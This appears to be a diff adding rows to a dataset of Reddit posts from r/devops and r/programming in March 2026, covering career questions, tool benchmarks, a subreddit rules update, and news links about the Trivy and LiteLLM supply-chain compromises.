+https://github.com/BerriAI/litellm/issues/24512
+
+Personally, I am not affected by this. Have you or the company you work for been affected?
+
+**DISCLAIMER**: Still awaiting an official statement about the RCA, but the above comment is a derivative of what has been posted in the GitHub issue.",11,4
+1s28xen,2026-03-24 17:25:13,reddit,r/devops,"DevOps + AI. Where are we headed? Need honest insights from the community Hi everyone,
+
+I’m a DevOps engineer with 5+ years of experience and wanted to get a broader perspective from the community on where things are heading.
+
+Quick background:
+
+* Terraform
+* AWS (ECS, ECR, IAM, RDS, Lambda, S3, CloudFront, CloudWatch CodeBuild, CodePipeline, EC2, Route53, API Gateway, Load Balancers, Auto Scaling, VPC, CloudWatch alarms – including custom &amp; composite alarms, SES, SQS, SNS, Secrets Manager, backups, and more)
+* Docker &amp; Kubernetes
+* CI/CD (Jenkins, GitHub Actions, GitLab CI, Bitbucket Pipelines)
+* Web servers and general infrastructure design
+* Databases (MongoDB, MySQL)
+* Python (basics + a bit of vibe coding here and there)
+
+Lately, I’ve been thinking a lot about how AI is impacting DevOps and wanted to understand the bigger picture.
+
+Some questions I’d love insights on:
+
+1. What is the future of DevOps with AI? Or is there a future in DevOps?
+2. How is AI currently being used in DevOps?
+3. Which AI tools are actually useful today? Beyond just hype.
+4. Is DevOps evolving into something else? Platform Engineering, SRE, or even MLOps? Should I be pivoting?
+5. What does the current job market look like? Is demand growing, stable, or declining?
+6. For someone with my background, how realistic is it to land remote roles with international companies today?
+7. What skills should I focus on next?
+
+I would really appreciate insights from people who are actively working in the field or hiring.
+
+Thanks in advance!",15,25
+1s28v4z,2026-03-24 17:21:22,reddit,r/devops,"VPS vs PaaS cost comparison I wanted to get a rough sense of what ""deploy convenience"" actually costs.
+
+This is based loosely on a small always-on app, around 2 vCPU and 4 GB RAM where the platform makes that possible. Not perfectly apples to apples, but good enough for a rough comparison.
+
+For baseline, a Hetzner VPS with 2 vCPU and 4 GB RAM costs a little under **$4/month** today (small increase expected in April)
+
+|PaaS|Price|Notes|
+|:-|:-|:-|
+|Heroku|**$250**|Heroku doesn't really have a clean public 4 GB tier, so the closest public number is Performance-M at 2.5 GB. The next jump is Performance-L at **$500/month** for 14 GB.|
+|Google Cloud Run|**$119**|2 vCPU + 4 GiB, 2,592,000 sec/month. billed per second.|
+|AWS App Runner|**$115**|2 vCPU + 4 GB, always active, 730 hrs/month. per hour for vCPU and memory separately.|
+|Render|**$104**|workspace pro ($19) + compute 2CPU and 4GB RAM ($85). compute price was buried, which I thought was a bit misleading.|
+|Railway|**$81**|2 vCPU + 4 GB running 24/7 (2,628,000 seconds)|
+|Digital Ocean App Platform|**$50**|2vCPU + 4GB RAM Shared container instance|
+|Fly .io|**$23.85**|2vCPI + 4GB RAM. pricing depends on region. I used the current Ashburn price|
+
+The obvious tradeoff is that PaaS buys you convenience. With a VPS, the compute is cheap, but you usually end up giving up the nicer deploy experience unless you add tooling on top.
+
+That gap feels a lot smaller now than it used to, opensource projects like [coolify](https://coolify.io/), or more lightweight options like [kamal](https://kamal-deploy.org/) or [haloy](https://haloy.dev/)",11,13
+1s2jszw,2026-03-25 01:08:32,reddit,r/devops,"Recommend me an open ended project please I managed to make a full stack nginx web server run on a free tier oracle OCI instance. 
+
+\- The infra is configured with terraform files
+
+\- The secrets and deployment are managed with github actions. 
+
+\- As for features it has a bunch of simple python scripts running on the server itself and a basic website running on the web server 
+
+\- via sshing to the server, I configured nginx to add my own domain name, added https with certbot, and configured the firewall with iptables
+
+The next idea I currently have that I want to build is a e2e predictive pipeline that can predict delays in my City's metro (they happen to have an free API key that I can use). 
+
+But I am open to suggestions where to go next to really build my DevOps/backend skills in a way I can easily document. ",2,1
+1s2cubx,2026-03-24 20:50:00,reddit,r/devops,"SBOM generation for make/cmake projects / embedded Hey devopses!
+
+This question goes to the more ""unlucky"" peeps that work on embedded projects.
+
+With the CRA deadlines approaching, I cannot help but wonder how you all generate your SBOMS?
+
+There is this great tool called cdxgen - for the setup I am working on, it seems very limited...
+
+Say you have a project that uses no proper package management, uses submodules instead, that are not checked out in modules/\* but in submodules/\* or other folders, and randomly downloads files with curl instead of say, fetch content? 
+
+I am guessing most of the projects out there work like that, because ain't nobody got time for conan. So how do y'all solve this issue?
+
+Cheers!
+
+  
+
+
+
+
+",1,4
+1s20yof,2026-03-24 10:01:13,reddit,r/devops,"Opsgenie end of life - read-only April 17th, 2026 Is anyone else seeing a banner on opsgenie showing that it will go to read-only mode by April 17th (less than a month away)?
+
+I thought we had until this time of 2027.  Rendering opsgenie read-only will effectively make the app unusuable in 3 weeks from now.  I swear I just saw this Banner recently in the last couple of weeks.
+
+Not the best heads up, Atlassian...",5,3
+1s29gug,2026-03-24 17:58:15,reddit,r/devops,"How to securePAT Tokens in Shared VM for GitHub Runners Hello guys! Hope you're doing well.
+We configure and run our GitHub runners on a VM that is accessible to anyone on our team. The command used by our team includes a PAT token. One of my teammates has set it up as an environment variable, but it could still be accessed.
+Since PAT tokens are very sensitive, I would like to know how this can be handled securely. I would really appreciate advice from someone experienced. Thanks!",1,3
+1s1jsp8,2026-03-23 23:20:19,reddit,r/devops,"I've written an operator for managing RustFS buckets and users via CRDs Hi,
+
+I actually don't really think that anybody would need it, but I guess having this post here won't hurt after all.
+
+I've been considering migrating from Minio to RustFS for a bit, but I didn't feel like managing access manually, and since all my workloads are running in k8s I've decided to write an operator that would handle the access management. 
+
+The idea is pretty simple, I've used the approach from another operator that I maintain: [db-operator](https://github.com/db-operator/db-operator) (The same idea but for databases)
+
+Connect the controller via a cluster CR to a running RustFS instance and start creating bucket and user with namespaced CRs already.
+
+So with this operator, you can create buckets and create users that will have either `readWrite` or `readOnly` access to these buckets.
+
+For each `Bucket CR` there will be a `ConfigMap` created that will contain:
+- Instance URL
+- Instance Region
+- Bucket name
+
+And for each user you'll have a `Secret` with an access key and a secret key.
+
+So you can mount them into a container or use as env vars to connect.
+
+The code can be found here: https://github.com/allanger/rustfs-manager-operator
+
+And here is the doc: https://allanger.github.io/rustfs-manager-operator/
+
+It's still a pretty raw project, so I would expect bugs, and it lacks a couple of features for sure, for example secret watcher, but generally I guess it's usable.
+
+Thanks
+",19,7
+1s20w4p,2026-03-24 09:58:10,reddit,r/devops,"CI/CD ephemeral runner/agent caching What do you use for CI/CD ephemeral runners/agents to cache dependencies like Maven or npm?
+
+My runners are self-hosted(deployed in Kubernetes), but I haven’t had much luck finding caching solutions:( Any recommendations?",1,2
+1s1eve7,2026-03-23 20:00:19,reddit,r/devops,QA to devOps engineer So Currently Im working as a QA( 6 months intern + 4months ft) in a mnc. I told my manager Im interested in devops so he has assigned some work of migrating repo from github to gitlab ( to gain experience). I have done automation work in my current Qa rule.. I’m aiming to switch roles in aug-sep. He said if any opening is there he’ll recommend me. So I just wanna ask how tough it to switch roles &amp; what are the things I should spend more time to learn? ,2,4
+1s0rt5j,2026-03-23 01:34:19,reddit,r/devops,"Aws WAF for Security What the best practice for aws waf rules to allow SEO bots , social media bots , inspectlet , ahrefs and meta regarding on block non browser user agents??",7,10
+1s11kz4,2026-03-23 08:01:49,reddit,r/devops,"Backend dev → DevOps: what skills to focus on for long term? I moved to a DevOps team in January after a reorg. I have roughly 2 YOE backend + some Python scripting, but limited DevOps experience beyond Docker (sorry guys). In the last 3 months have been trial by fire, learning IaC, deployments, and concepts on the fly while supporting teams. Mostly feels like learning just enough to ship. Role is a mix of infra, deployments, and platform.
+However, I actually do enjoy this work a lot more than I expected as it has given me a lot of opportunities. 
+
+
+I’m feeling a bit lost when it comes to career direction since most of my mentors are focused on feature development rather than DevOps. I’d love to get advice on which skills to focus on long term to make myself more valuable both in my current role and for future opportunities. I’m fine learning things on the fly, but I’d like to be more intentional about what I focus on. We use pretty much industry standard tech stack (Terraform, Docker/Kubernetes, AWS, Datadog) and ever growing and modernizing. 
+
+
+I was thinking my focus would be something along the lines of foundation building Kubernetes (CKA) and go from there, but not sure what ""from there"" is.",2,4
+1rzv98l,2026-03-22 00:06:13,reddit,r/devops,"jsongrep is faster than {jq, jmespath, jsonpath-rust, jql} jsongrep is an open source tool I made for querying JSON that is fast, like really really fast.
+
+I started working on the project as part of my undergraduate research— it has an intuitive regular path query language and also exposes its search engine as a Rust library if you’re looking to integrate into your Rust projects. 
+
+I find the tool incredibly useful for working with JSON and it has become my de facto JSON tool over existing projects like jq. 
+
+Technical blog post: https://micahkepe.com/blog/jsongrep/
+
+GitHub: https://github.com/micahkepe/jsongrep
+
+Benchmarks: https://micahkepe.com/jsongrep/end\_to\_end\_xlarge/report/index.html",114,32
+1s05sl4,2026-03-22 07:16:01,reddit,r/devops,"Transitioning from 10 Years in Support to Core DevOps — How Did You Break Through? Hi everyone,
+
+I’ve been working as an application support /cloud support/devops support engineer for the past 10 years and have reached a point where salary growth has plateaued. I’m now trying to transition into a core DevOps role but finding it difficult to break in despite having relevant certifications and exposure.
+
+So far, I have:
+
+	•	Azure Architect (AZ-305)
+
+	•	Azure Administrator (AZ-104)
+
+	•	GCP Associate Cloud Engineer
+
+•.    Terraform associate 
+
+	•	Hands-on exposure to cloud applications, containers, Terraform, and CI/CD pipelines (GitHub Actions)
+
+However, most of my experience is still support-heavy, and I’m struggling to get opportunities that involve deeper DevOps or platform engineering work.
+
+I wanted to ask:
+
+	•	Has anyone here successfully transitioned into core DevOps after spending many years in support roles?
+
+	•	What specific steps helped you break through? (projects, internal moves, certifications, networking, etc.)
+
+	•	Are there any freelance or platform-based opportunities where I can gain real hands-on experience (even if unpaid initially)?
+
+Appreciate any guidance or personal experiences you can share.
+
+Thanks in advance!",15,23
+1s00x6l,2026-03-22 03:50:24,reddit,r/devops,"From 6 years MERN Full Stack to DevOps in 2026 (AI era) , just finished 1.5 month full-time tool grind, planning 10-15 projects. Real talk: what do I actually need to land a job? Hey r/devops,
+
+**Quick intro**: I’ve been a full-stack dev for the last 6 years, mostly MERN (Mongo, Express, React, Node). Loved building apps, but lately I got super curious about the ""other side"" - infrastructure, automation, and how everything actually stays alive in production. 
+
+So last month I went full-time on DevOps: Docker, Jenkins, Kubernetes, Terraform, AWS, Linux, Ansible, Argo CD, Grafana, the whole stack. Spent 8-10 hours a day, built small demos, broke things on purpose, fixed them, etc.
+
+I know DevOps isn’t just “learn tools and you’re done” — it’s a culture, CI/CD mindset, collaboration between dev and ops, observability, GitOps, the whole philosophy. That part excites me the most.
+
+Right now I’m planning to build 10-15 solid projects (personal portfolio + maybe some open-source contributions) so I can actually show I can do this in real life.
+
+But here’s where I need the community’s real talk (2026 AI era edition):
+
+What do I actually still need to complete to be job-ready as a DevOps Engineer coming from a dev background? Specific projects that recruiters notice? Certifications that still matter? Extra skills (IaC patterns, security, cost optimization, multi-cloud)?
+
+What’s the current reality for DevOps roles right now? Is the market still good for career switchers? How has AI (Copilot, AI agents for infra, auto-remediation, etc.) actually changed day-to-day work? Are companies hiring more juniors/mid-levels or has everything become ""senior+ only"" because AI handles the basics?
+
+For someone switching from full-stack, what’s the best way to frame my resume and LinkedIn? Should I highlight my dev experience as a strength (I already understand pipelines from the app side) or hide it?
+
+Any horror stories or ""I wish I knew this earlier"" advice for people coming from app dev into platform engineering?
+
+Would love honest answers, no sugarcoating. Even if the answer is ""bro, market is tough right now, focus on X"", I can handle it. Just want to do this the right way.
+
+Thanks in advance, legends. Really appreciate this community.
+
+(Feel free to roast my current knowledge level too 😂)",25,25
+1s0iu2w,2026-03-22 19:05:19,reddit,r/devops,"Resources for learning about AWS Have dev and local cloud experience but looking for a good book/ PDF to learn more AWS architecture, infrastructure and deployment ",0,11
+1rz98r2,2026-03-21 05:43:38,reddit,r/devops,"Trivy - Supply chain attack [https://arstechnica.com/security/2026/03/widely-used-trivy-scanner-compromised-in-ongoing-supply-chain-attack/](https://arstechnica.com/security/2026/03/widely-used-trivy-scanner-compromised-in-ongoing-supply-chain-attack/)
+
+Of course this hits late on a Friday :(",137,28
+1rzbg4l,2026-03-21 07:12:43,reddit,r/devops,A Technical Write Up on the Trivy Supply Chain Attack I wrote a little blog on some deeper dives into how the Trivy Supply Chain attack happened: https://rosesecurity.dev/2026/03/20/typosquatting-trivy.html,47,7
+1rz2tx1,2026-03-21 01:37:00,reddit,r/devops,"I Benchmarked Redis vs Valkey vs DragonflyDB vs KeyDB Hi everyone
+
+I just created a benchmark comparing Redis, Valkey, DragonflyDB, and KeyDB.
+
+Honestly this one was pretty interesting, and some of the results were surprising enough that I reran the benchmark quite a few times to make sure they were real.
+As requested on my previous benchmarks, I also uploaded the benchmark to GitHub.
+
+|Benchmark|Redis `8.4.0`|DragonflyDB `v1.37.0`|Valkey `9.0.3`|KeyDB `v6.3.4`|
+|:-|:-|:-|:-|:-|
+|Small writes throughput `(higher is better)`|452,812 ops/s|494,248 ops/s|432,825 ops/s|385,182 ops/s|
+|Hot reads throughput `(higher is better)`|460,361 ops/s|494,811 ops/s|445,592 ops/s|475,307 ops/s|
+|Mixed workload throughput `(higher is better)`|444,026 ops/s|468,316 ops/s|428,907 ops/s|405,764 ops/s|
+|Pipeline throughput `(higher is better)`|1,179,179 ops/s|951,274 ops/s|1,461,472 ops/s|647,779 ops/s|
+|Hot reads p95 latency `(lower is better)`|0.607 ms|0.743 ms|1.191 ms|0.711 ms|
+|Mixed workload p95 latency `(lower is better)`|0.623 ms|0.783 ms|1.271 ms|0.735 ms|
+|Pub/Sub p95 latency `(lower is better)`|0.592 ms|0.583 ms|1.002 ms|0.557 ms|
+
+Full benchmark + charts: [here](https://www.repoflow.io/blog/redis-vs-valkey-vs-dragonflydb-vs-keydb-benchmarks)
+
+[GitHub](https://github.com/RepoFlow-Package-Management/redis-compatible-cache-benchmarks?tab=readme-ov-file)
+
+Happy to run more tests if there’s interest",69,17
+1rzg0no,2026-03-21 10:36:03,reddit,r/devops,"Is it wise for me to work on this and migrate out of Jenkins to Bitbucket Pipelines? I have an existing infra repository that uses terraform to build resources on AWS for various projects. It already have VPC and other networking set up and everything is working well.
+
+I’m looking to migrate it out to opentofu and using bitbucket pipelines to do our CI/CD as opposed to Jsnkins which is our current CI/CD solution.
+
+Is it wise for me to create another VPC on a new mono-repo or should I just leverage the existing VPC? for this?
+
+I’m looking to shift all our staging environment to on-site and using NGINX and ALB to direct all traffic to the relevant on-site resources and only use AWS for prod services. Would love to have your advice on this",11,32
+1ryuizz,2026-03-20 20:10:00,reddit,r/devops,"Trivy Compromised a Second Time - Malicious v0.69.4 Release, aquasecurity/setup-trivy, aquasecurity/trivy-action GitHub Actions Compromised Another compromise of trivy within a month...ongoing investigation/write up:  
+  
+[https://www.stepsecurity.io/blog/trivy-compromised-a-second-time---malicious-v0-69-4-release](https://www.stepsecurity.io/blog/trivy-compromised-a-second-time---malicious-v0-69-4-release)
+
+Time to re-evaluate this tooling perhaps?",107,27
+1rz148h,2026-03-21 00:33:30,reddit,r/devops,"Replacing MinIO with RustFS via simple binary swap (Zero-data migration guide) Hi everyone, I’m from the **RustFS** team (**u/rustfs\_official**).
+
+If you’re managing MinIO clusters, you’ve probably seen the recent repo archiving. For the r/devops community, ""migration"" usually means a massive headache—egress costs, downtime, and the technical risk of moving petabytes of production data over the network.
+
+We’ve been working on a **binary replacement** path to skip that entirely. Instead of a traditional move, you just update your Docker image or swap the binary. The engine is built to natively parse your existing bucket metadata, IAM policies, and lifecycle rules directly from the on-disk format.
+
+**Why this fits a DevOps workflow:**
+
+* **Actually ""Drop-in"":** Designed to be swapped into your existing `docker-compose` or K8s manifests. It maintains **S3 API parity**, so your application-level endpoints don't need to change.
+* **Rust-Native Performance:** We built this for high-concurrency AI/ML workloads. Using Rust lets us eliminate the GC-related latency spikes often found in Go-based systems. RDMA and DPU support are on our roadmap to offload the storage path from the CPU.
+* **Predictable Tail Latency:** We’ve focused on a leaner footprint and more consistent performance than legacy clusters, especially under heavy IOPS.
+* **Zero-Data Migration:** **No re-uploading or network transfer.** RustFS reads the existing MinIO data layout natively, so you keep your data exactly where it is during the swap.
+
+We’re tracking the technical implementation and the step-by-step migration guide in this GitHub issue: 
+
+[https://github.com/rustfs/rustfs/issues/2212](https://github.com/rustfs/rustfs/issues/2212)
+
+We are currently at `v1.0.0-alpha.87` and pushing toward a stable Beta in April.",42,8
+1qoxwdt,2026-01-28 09:54:14,reddit,r/programming,"State of the Subreddit (January 2027): Mods applications and rules updates tl;dr: mods applications and minor rules changes. Also it's 2026, lol.
+
+Hello fellow programs!
+
+It's been a while since I've [checked in](https://old.reddit.com/r/programming/comments/1chs4ib/the_state_of_the_subreddit_may_2024/) and I wanted to give an update on the state of affairs. I won't be able to reply to every single thing but I'll do my best.
+
+# Mods applications
+
+I know there's been some [frustration about moderation resources](https://old.reddit.com/r/programming/comments/1qni22q/meta_mods_when_will_you_get_on_top_of_the/) so first things first, I want to open up applications for new mods for r/programming. If you're interested please start by reading the [State of the Subreddit (May 2024)](https://old.reddit.com/r/programming/comments/1chs4ib/the_state_of_the_subreddit_may_2024/) post for the reasoning behind the current rulesets, then leave a comment below with the word ""application"" somewhere in it so that I can tell it apart from the memes. In there please give at least:
+
+- Why you want to be a mod
+- Your favourite/least favourite kinds of programming content here or anywhere else
+- What you'd change about the subreddit if you had a magic wand, ignoring feasibility
+- Reddit experience (new user, 10 year veteran, spez himself) and moderation experience if any
+
+I'm looking to pick up 10-20 new mods if possible, and then I'll be looking to them to first help clean the place up (mainly just keeping the new page free of rule-breaking content) and then for feedback on changes that we could start making to the rules and content mix. I've been procrastinating this for a while so wish me luck. We'll probably make some mistakes at first so try to give us the benefit of the doubt.
+
+# Rules update
+
+Not much is changing about the rules since [last time](https://old.reddit.com/r/programming/comments/1chs4ib/the_state_of_the_subreddit_may_2024/) except for a few things, most of which I said last time I was keeping an eye on
+
+- 🚫 **Generic AI content** that has nothing to do with programming. It's gotten out of hand and our users hate it. I thought it was a brief fad but it's been 2 years and it's still going.
+- 🚫 **Newsletters** I tried to work with the frequent fliers for these and literally zero of them even responded to me so we're just going to do away with the category
+- 🚫 ""**I made this**"", previously called demos with code. These are generally either a blatant ad for a product or are just a bare link to a GitHub repo. It was previously allowed when it was at least a GitHub link because sometimes people discussed the technical details of the code on display but these days even the code dumps are just people showing off something they worked on. That's cool, but it's not programming content.
+
+## The rules!
+
+With all of that, here is the current set of the rules with the above changes included so I can link to them all in one place.
+
+✅ means that it's currently allowed, 🚫 means that it's not currently allowed, ⚠️ means that we leave it up if it is already popular but if we catch it young in its life we do try to remove it early, 👀 means that I'm not making a ruling on it today but it's a category we're keeping an eye on
+
+* ✅ Actual programming content. They probably have actual code in them. Language or library writeups, papers, technology descriptions. How an allocator works. How my new fancy allocator I just wrote works. How our startup built our Frobnicator. For many years this was the only category of allowed content.
+* ✅ Academic CS or programming papers
+* ✅ Programming news. ChatGPT can write code. A big new CVE just dropped. Curl 8.01 released now with Coffee over IP support.
+* ✅ Programmer career content. How to become a Staff engineer in 30 days. Habits of the best engineering managers. These must be related or specific to programming/software engineering careers in some way
+* ✅ Articles/news interesting *to* programmers but not about programming. Work from home is bullshit. Return to office is bullshit. There's a Steam sale on programming games. Terry Davis has died. How to SCRUMM. App Store commissions are going up. How to hire a more diverse development team. Interviewing programmers is broken.
+* ⚠️ General technology news. Google buys its last competitor. A self driving car hit a pedestrian. Twitter is collapsing. Oculus accidentally showed your grandmother a penis. Github sued when Copilot produces the complete works of Harry Potter in a code comment. Meta cancels work from home. Gnome dropped a feature I like. How to run Stable Diffusion to generate pictures of, uh, cats, yeah it's definitely just for cats. A bitcoin VR metaversed my AI and now my app store is mobile social local.
+* 🚫 Anything clearly written mostly by an LLM. If you don't want to write it, we don't want to read it.
+* 🚫 Politics. The Pirate Party is winning in Sweden. Please vote for net neutrality. Big Tech is being sued in Europe for *gestures broadly*. Grace Hopper Conference is now 60% male.
+* 🚫 Gossip. Richard Stallman switches to Windows. Elon Musk farted. Linus Torvalds was a poopy-head on a mailing list. The People's Rust Foundation is arguing with the Rust Foundation For The People. Terraform has been forked into Terra and Form. Stack Overflow sucks now. Stack Overflow is good actually.
+* 🚫 Generic AI content that has nothing to do with programming. It's gotten out of hand and our users hate it.
+* 🚫 Newsletters, Listicles or anything else that just aggregates other content. If you found 15 open source projects that will blow my mind, post those 15 projects instead and we'll be the judge of that.
+* 🚫 Demos without code. I wrote a game, come buy it! Please give me feedback on my startup (totally not an ad nosirree). I stayed up all night writing a commercial text editor, here's the pricing page. I made a DALL-E image generator. I made the fifteenth animation of A* this week, here's a GIF.
+* 🚫 Project demos, ""I made this"". Previously called demos with code. These are generally either a blatant ad for a product or are just a bare link to a GitHub repo. 
+* ✅ Project technical writups. ""I made this _and here's how_"". As said above, true technical writeups of a codebase or demonstrations of a technique or samples of interesting code in the wild are absolutely welcome and encouraged. All links to projects must include what makes them technically interesting, not just what they do or a feature list or that you spent all night making it. The technical writeup must be the _focus_ of the post, not just a tickbox checking exercise to get us to allow it. This is a technical subreddit, not Product Hunt. We don't care what you built, we care _how_ you build it.
+* 🚫 AskReddit type forum questions. What's your favourite programming language? Tabs or spaces? Does anyone else hate it when.
+* 🚫 Support questions. How do I write a web crawler? How do I get into programming? Where's my missing semicolon? Please do this obvious homework problem for me. Personally I feel very strongly about not allowing these because they'd quickly drown out all of the actual content I come to see, and there are already much more effective places to get them answered anyway. In real life the quality of the ones that we see is also universally very low.
+* 🚫 Surveys and 🚫 Job postings and anything else that is looking to extract value from a place a lot of programmers hang out without contributing anything itself.
+* 🚫 Meta posts. DAE think r/programming sucks? Why did you remove my post? Why did you ban this user that is totes not me I swear I'm just asking questions. Except this meta post. This one is okay because I'm a tyrant that the rules don't apply to (I assume you are saying about me to yourself right now).
+* 🚫 Images, memes, anything low-effort or low-content. Thankfully we very rarely see any of this so there's not much to remove but like support questions once you have a few of these they tend to totally take over because it's easier to make a meme than to write a paper and also easier to vote on a meme than to read a paper.
+* ⚠️ Posts that we'd normally allow but that are obviously, unquestioningly super low quality like blogspam copy-pasted onto a site with a bazillion ads. It has to be pretty bad before we remove it and even then sometimes these are the first post to get traction about a news event so we leave them up if they're the best discussion going on about the news event. There's a lot of grey area here with CVE announcements in particular: there are a lot of spammy security ""blogs"" that syndicate stories like this.
+* ⚠️ Extreme beginner content. What is a variable. What is a `for` loop. Making an HTPT request using curl. Like listicles this is disallowed because of the quality typical to them, but high quality tutorials are still allowed and actively encouraged.
+* ⚠️ Posts that are duplicates of other posts or the same news event. We leave up either the first one or the healthiest discussion.
+* ⚠️ Posts where the title editorialises too heavily or especially is a lie or conspiracy theory.
+* Comments are only very loosely moderated and it's mostly 🚫 Bots of any kind (Beep boop you misspelled misspelled!) and 🚫 Incivility (You idiot, everybody knows that my favourite toy is better than your favourite toy.)
+However the number of obvious GPT comment bots is rising and will quickly become untenable for the number of active moderators we have.
+* 👀 vibe coding articles. ""I tried vibe coding you guys"" is apparently a hot topic right now. If they're contentless we'll try to be on them under the general quality rule but we're leaving them alone for now if they have anything to actually say. We're not explicitly banning the category but you are encouraged to vote on them as you see fit.
+* 👀 Corporate blogs simply describing their product in the guise of ""what is an authorisation framework?"". Pretty much anything with a rocket ship emoji in it. Companies use their blogs as marketing, branding, and recruiting tools and that's okay when it's ""writing a good article will make people think of us"" but it doesn't go here if it's just a literal advert. Usually they are titled in a way that I don't spot them until somebody reports it or mentions it in the comments.
+
+r/programming's **mission** is to **be the place with the highest quality programming content, where I can go to read something interesting and learn something new every day**.
+
+_In general_ rule-following posts will stay up, even if subjectively they aren't that great. We want to default to allowing things rather than intervening on quality grounds (except LLM output, etc) and let the votes take over. On r/programming the voting arrows mean ""show me more like this"". We use them to drive rules changes. So **please, vote away**. Because of this we're not especially worried about categories just because they have a lot of very low-scoring posts that sit at the bottom of the hot page and are never seen by anybody. If you've scrolled that far it's because you went through the higher-scoring stuff already and we'd rather show you that than show you nothing. On the other hand sometimes rule-breaking posts aren't obvious from just the title so also **don't be shy about reporting** rule-breaking content when you see it. Try to leave some context in the report reason: a lot of spammers report everything else to drown out the spam reports on their stuff, so the presence of one or two reports is often not enough to alert us since sometimes everything is reported.
+
+There's an unspoken metarule here that the other rules are built on which is that all content should point ""outward"". That is, it should provide more value to the community than it provides to the poster. Anything that's looking to extract value from the community rather than provide it is disallowed even without an explicit rule about it. This is what drives the prohibition on job postings, surveys, ""feedback"" requests, and partly on support questions.
+
+Another important metarule is that mechanically it's not easy for a subreddit to say ""we'll allow 5% of the content to be support questions"". So for anything that we allow we must be aware of types of content that beget more of themselves. Allowing memes and CS student homework questions will pretty quickly turn the subreddit into _only_ memes and CS student homework questions, leaving no room for the subreddit's actual mission.",116,90
+1s2y7uy,2026-03-25 10:18:46,reddit,r/programming,"The junior developer pipeline is broken, and nobody has a plan to fix it",823,210
+1s2h8lt,2026-03-24 23:37:44,reddit,r/programming,"Litellm 1.82.7 and 1.82.8 on PyPI are compromised, do not update! We just have been compromised, thousands of peoples likely are as well, more details updated IRL at the link
+
+Update: Callum McMahon, who discovered this, wrote an explainer and postmortem going into greater detail: [https://futuresearch.ai/blog/no-prompt-injection-required](https://futuresearch.ai/blog/no-prompt-injection-required)",478,53
+1s35ohw,2026-03-25 17:11:57,reddit,r/programming,How the TeamPCP attack exploited CI/CD pipelines and trusted releases to release infected Trivy and LiteLLM packages TeamPCP attack shows how CI/CD can be abused by compromised pipelines to compromised repos to push out infostealers in the packages. Most notable ones were Aquasec's entire GitHub acc including Trivy repo and LiteLLM python package.,13,1
+1s2h4by,2026-03-24 23:33:36,reddit,r/programming,"Malicious litellm 1.82.8: Credential Theft and Persistent Backdoor litellm, a famous python package got compromised and it executes on your system without even importing it — cloud creds, SSH keys, K8s secrets, crypto wallets, env vars and what not, all exfiltrated to the attacker's server.
+
+**Full technical analysis:** [https://safedep.io/malicious-litellm-1-82-8-analysis/](https://safedep.io/malicious-litellm-1-82-8-analysis/)",87,12
+1s2bw68,2026-03-24 20:06:42,reddit,r/programming,"Designing a Python Language Server: Lessons from Pyre that Shaped Pyrefly [Pyrefly](https://github.com/facebook/pyrefly) is a next-generation Python type checker and language server, designed to be extremely fast and featuring advanced refactoring and type inference capabilities. 
+
+Pyrefly is a spiritual successor to [Pyre](https://pyre-check.org/), the previous Python type checker developed by the same team. The differences between the two type checkers go far beyond a simple rewrite from OCaml to Rust - we designed Pyrefly from the ground up, with a completely different architecture.
+
+Pyrefly’s design comes directly from our experience with Pyre. Some things worked well at scale, while others did not. After running a type checker on massive Python codebases for a long time, we got a clearer sense of which trade-offs actually mattered to users.
+
+This post is a write-up of a few lessons from Pyre that influenced how we approached Pyrefly.
+
+Link to blog: https://pyrefly.org/blog/lessons-from-pyre/
+
+The outline of topics is provided below that way you can decide if it's worth your time to read :)
+- Language-server-first Architecture
+- OCaml vs. Rust
+- Irreversible AST Lowering
+- Soundness vs. Usability
+- Caching Cyclic Data Dependencies",53,3
+1s2oisv,2026-03-25 03:55:31,reddit,r/programming,Developer Experience 2026: DX Is the Competitive Moat | RuneHub,6,1
+1s1e4il,2026-03-23 19:22:34,reddit,r/programming,"Software dev job postings are up 15% since mid 2025 Been watching this FRED data for a while. Software development job postings on Indeed hit a low point around May 2025, then climbed steadily for 10 months straight and are now sitting about 15% higher than that trough. The recent acceleration from January 2026 onwards is pretty sharp.
+
+This runs directly against the AI is killing developer jobs narrative that's been everywhere for the past two years.
+
+I might be wrong but i think AI might actually be creating more software demand, not less. More products get built because the cost of building dropped. Someone still has to architect the systems, build the tooling, maintain the infrastructure. that's all still dev work.
+
+Curious what people here are actually seeing. Are you busier or less busy than two years ago? And if you're hiring, is the bar different now?",2013,316
+1s2blu7,2026-03-24 19:53:01,reddit,r/programming,Handheld NES on a ESP32,19,8
+1s32qin,2026-03-25 14:09:13,reddit,r/programming,"Why Raft can’t safely commit old-term entries — from an implementation/debugging perspective I recently finished the MIT distributed systems labs and wrote up one Raft rule that took me some time to fully understand: why a leader cannot safely commit old-term entries just because they’re replicated on a majority.
+
+When reading the paper, this can feel like a detail you just accept and move on from. But during implementation/debugging, it becomes much more concrete. You start seeing why “replicated on a majority” is not enough by itself, and why the current-term restriction matters for safety.
+
+I tried to explain it from the perspective of someone implementing and debugging Raft, not just restating the theory.
+
+Article: [https://abdellani.dev/posts/2026-03-23-why-raft-cant-safely-commit-old-term-entries/](https://abdellani.dev/posts/2026-03-23-why-raft-cant-safely-commit-old-term-entries/)
+
+I’d be curious how this clicked for others:  
+did it make sense immediately from the Raft paper, or only after implementing/debugging it?",0,1
+1s2xapb,2026-03-25 09:38:52,reddit,r/programming,"Debug, visualize and test embedded C/C++ through instrumentation",0,0
+1s3ams9,2026-03-25 21:23:39,reddit,r/programming,Open source isn't a tip jar – it's time to charge for access,0,22
+1s1rynd,2026-03-24 04:07:38,reddit,r/programming,A table was all that was needed to fix Python autocomplete,136,17
+1s1luym,2026-03-24 00:34:35,reddit,r/programming,Announcing TypeScript 6.0,228,28
+1s1jkki,2026-03-23 23:11:41,reddit,r/programming,Is waterfall making a quiet comeback? (sort of),223,150
+1s2wfne,2026-03-25 09:01:19,reddit,r/programming,T-shirt Driven Development,0,12
+1s2077v,2026-03-24 09:28:03,reddit,r/programming,Generators in lone lisp,2,0
+1s1dtk5,2026-03-23 19:06:35,reddit,r/programming,Qt 6.11 released,19,1
+1s2gjgv,2026-03-24 23:12:50,reddit,r/programming,"Don't Count Java out Yet I remember when I first started working, I loved visiting this old mainframe building, where the ""serious"" software engineering work was being done. The mainframe was long-gone, but the hard-core vibe of the place still lingered.
+
+
+
+As I took any excuse to walk past a different part of the building to try and sneak a peek into whatever compute wizardry I imagined was being conjured up, one thing I always noticed was copies of InfoWorld being strewn across desks and tables (and yes, even in the bathroom - hey, I said it was hard-core ;-) ).
+
+
+
